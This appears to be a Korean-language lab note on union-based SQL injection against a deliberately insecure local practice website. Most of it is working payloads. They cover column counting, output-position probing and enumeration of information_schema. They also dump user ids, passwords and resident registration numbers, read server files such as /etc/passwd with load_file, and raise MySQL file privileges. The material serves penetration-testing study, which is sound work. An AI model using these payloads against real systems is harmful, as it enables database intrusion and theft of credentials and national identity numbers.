### Union-Based 공격 통한 중요 정보 탈취 실습
게시판에서 목록 조회를 통한 정보 탈취를 해본다.     
UNION은 컬럼 개수, 데이터 타입이 동일해야 한다. null은 데이터타입의 영향을 받지 않음.        
1) order by 구문을 통해 컬럼 개수 식별    
   1이면 1번 컬럼, 2면 2번 컬럼으로 정렬.. 그러므로 에러가 나면 컬럼 개수를 알 수 있다.    
    ` order by 9# - 출력 됨     
    ` order by 10# - Error 발생       
    => 컬럼 개수 : 9개
2) UNION 구문      
   - ' union select null,null,null,null,null,null,null,null,null#
   - 게시글을 공격한다고 가정할 때 데이터가 많을 경우 공격이 마지막에 위치하여 확인이 어려울 수 있음.     
     그러므로 상위 SELECT 문을 거짓으로 하여 레코드 출력을 방지    
     ' and 1=2 union select null,'test',null,null,null,null,null,null,null#
  
3) 출력 포지션 파악    
 - 데이터 타입이 컬럼 별로 같아야 하므로 'test'를 컬럼 별로 넣어주면서 파라미터를 매칭해본다.      
   test를 넣었을 때 출력이 되면 해당 포지션에 특정한 함수를 넣어 출력해 볼 수 있다.          
     ' and 1=2 union select 'test',null,null,null,null,null,null,null,null#    
     ' and 1=2 union select 'test','test',null,null,null,null,null,null,null#    
     ' and 1=2 union select 'test','test',null,'test',null,null,null,null,null#        

   * 데이터 조회 공격 프로세스 - 모든 데이터 조회 공격 기법 동일
     1) 기본 정보 목록화 - 버전, 사용자, 현재 데이터베이스명
     2) 메타 데이터 목록화
     3) 데이터 목록화      
4) 포지션을 알았다면 데이터 조회 공격 프로세스에 따라 해본다.
   1) 기본 정보를 목록화해본다.(system user, version, database name)
   - ' and 1=2 union select system_user(),version(),null,null,database(),null,null,null,null#    
     조회 결과 : root@localhost	8.0.30	pentest    
   2) 메타 데이터 목록화 - 데이터 사전(Data Dictionary)    
     MYSQL : information_schema.schemata,information_schema.tables,information_schema.columns     
     MSSQL : master.sys.databases,[db].sys.objects,[db].sys.columns   
     Oracle : all_tables, all_tab_columns    
      - 데이터 베이스 목록화      
        ' and 1=2 union select null,schema_name,null,null,database(),null,null,null,null from information_schema.schemata#    
        모든 schema 정보가 조회 됨. 출력 결과 : mysql, information_schema,mysql, pentest      
      - 테이블 목록화      
        ' and 1=2 union select null,table_name,null,null,database(),null,null,null,null from information_schema.tables where table_schema='pentest'#    
        출력 결과 : customer_info,insecure_board,members      
      - 컬럼 목록화
        - 테이블 : customer_info
         ' and 1=2 union select null,column_name,null,null,database(),null,null,null,null from information_schema.columns where table_schema='pentest' and table_name='customer_info'#    
        출력 결과 : idx, id, password,jumin     
        - 테이블 : members     
         ' and 1=2 union select null,column_name,null,null,database(),null,null,null,null from information_schema.columns where table_schema='pentest' and table_name='members'#    
        출력 결과 : idx,id,password,name,email,company        
    3) 데이터 목록화
        - 테이블 : customer_info
        ' and 1=2 union select id,password,null,null,jumin,null,null,null,null from customer_info#        
        출력 결과로 ip,password, jumin번호를 얻을 수 있다.   
        - 테이블 : members     
        ' and 1=2 union select id,password,null,null,name,null,null,null,null from members#        
        출력 결과로 ip,password, name을 얻을 수 있다.    


### Union-Based 공격을 통한 로컬 파일 무단 열람 실습 (실습 환경은 윈도우) 안되네. 나중에..
서버와 DB가 같은 스토리지에 존재하고 Mysql을 사용할 경우 load_file함수를 통해 공격 가능     
- 일반적으로 linux,unix 환경이면 /etc/passwd를 많이 열람하게 됨     
  ' and 1=2 union select null,load_file('/etc/passwd'),null,null,null,null,null,null,null#      
  1) 권한 확인
    - SQL로 접근가능하면 select file_priv from mysql.user where user='root'
    보통 "Y"인데 "N"이면 update
    update mysql.user set file_priv='Y' where user='root';
    flush privileges;
    - 보통 공격할 때 SQL로 접근 불가능
    ' and 1=2 union select null,file_priv('/Users/wisdom/secret_info.txt'),null,null,null,null,null,null,null from mysql.user where user='root'#   
  2) 하기와 같이 파일 열람 공격.
  ' and 1=2 union select null,load_file('/Users/wisdom/secret_info.txt'),null,null,null,null,null,null,null#     
  

### Union-Based 공격을 통한 상세화면 공격, 로컬 파일 무단 열람 실습
1) 상세화면 주소창에서 주소 확인
  http://127.0.0.1:8888/insecure_website/index.php?page=view&idx=3
2) 주소창에 order by 10%23하면 Error가 발생함을 확인. Column은 9개      
3) union으로 출력 위치를 바꿔가며 공격해 본다.     
   http://127.0.0.1:8888/insecure_website/index.php?page=view&idx=3 union select 'test',null,null,null,null,null,null,null,null%23      
   http://127.0.0.1:8888/insecure_website/index.php?page=view&idx=3 union select null,'test',null,null,null,null,null,null,null%23      
    => test 출력 됨 .     
   http://127.0.0.1:8888/insecure_website/index.php?page=view&idx=3 union select null,load_file(FileName),null,null,null,null,null,null,null%23
